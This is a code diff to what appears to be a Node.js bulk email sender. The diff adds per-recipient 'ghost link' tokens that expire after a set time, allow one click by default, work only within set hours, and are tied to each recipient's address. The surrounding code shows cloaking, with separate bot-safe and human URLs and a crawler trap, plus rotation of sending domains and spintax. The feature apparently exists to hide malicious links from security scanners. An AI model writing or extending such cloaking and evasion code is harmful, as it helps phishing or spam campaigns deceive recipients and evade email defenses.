@@ -1770,7 +1770,13 @@ app.post('/api/send', async (req, res) => {
         botSafeUrl,
         humanDefaultUrl,
         socketId,
-        ghostLinkInput // <--- ADDED THIS
+        ghostLinkInput, // <--- ADDED THIS
+        ghostLinkTTL,
+        ghostLinkMaxClicks,
+        ghostLinkStartHour,
+        ghostLinkStartMinute,
+        ghostLinkEndHour,
+        ghostLinkEndMinute
     } = req.body;
 
     // 1. UPDATE THE CRAWLER TRAP GLOBAL VARIABLE
@@ -2272,10 +2278,44 @@ res.json({ ok: true, message: "Batch started", total: recipients.length });
             ? activeDomains[Math.floor(emailsSent / rotateEvery) % activeDomains.length]
             : null;
 // Add explicitGhostLink so mailer.js can see your "Diff Box" input
-tagData = { 
-    ...tagData, 
+// Create per-recipient ghost token if ghost link is provided
+let ghostToken = null;
+if (ghostLinkInput && ghostLinkInput.trim()) {
+    ghostToken = crypto.randomBytes(12).toString('base64url');
+    const ttlHours = parseInt(ghostLinkTTL, 10) || 24;
+    const ttlMs = ttlHours * 60 * 60 * 1000;
+
+    ghostLinkStore.set(ghostToken, {
+        url: ghostLinkInput.trim(),
+        clicks: 0,
+        maxClicks: parseInt(ghostLinkMaxClicks, 10) || 1,
+        createdAt: Date.now(),
+        expiresAt: Date.now() + ttlMs,
+        startHour: ghostLinkStartHour !== undefined ? parseInt(ghostLinkStartHour, 10) : 6,
+        startMinute: ghostLinkStartMinute !== undefined ? parseInt(ghostLinkStartMinute, 10) : 0,
+        endHour: ghostLinkEndHour !== undefined ? parseInt(ghostLinkEndHour, 10) : 22,
+        endMinute: ghostLinkEndMinute !== undefined ? parseInt(ghostLinkEndMinute, 10) : 0,
+        recipientEmail: recipientMailContext.recipientEmail,
+        createdFor: recipientMailContext.firstName || 'Unknown'
+    });
+
+    // Auto-cleanup after expiration
+    setTimeout(() => {
+        ghostLinkStore.delete(ghostToken);
+    }, ttlMs);
+}
+
+tagData = {
+    ...tagData,
     activeDomain: emailDomain || 'your domain',
-    explicitGhostLink: ghostLinkInput ? ghostLinkInput.trim() : null 
+    explicitGhostLink: ghostLinkInput ? ghostLinkInput.trim() : null,
+    ghostToken: ghostToken, // Pass the token to mailer
+    ghostLinkTTL: ghostLinkTTL || 24,
+    ghostLinkMaxClicks: ghostLinkMaxClicks || 1,
+    ghostLinkStartHour: ghostLinkStartHour !== undefined ? ghostLinkStartHour : 6,
+    ghostLinkStartMinute: ghostLinkStartMinute !== undefined ? ghostLinkStartMinute : 0,
+    ghostLinkEndHour: ghostLinkEndHour !== undefined ? ghostLinkEndHour : 22,
+    ghostLinkEndMinute: ghostLinkEndMinute !== undefined ? ghostLinkEndMinute : 0
 };
 
         // Resolve spintax and tags first; wrap once (fragment only in UI—no full <!DOCTYPE>/<html>/<body> or Gmail gets a double document).
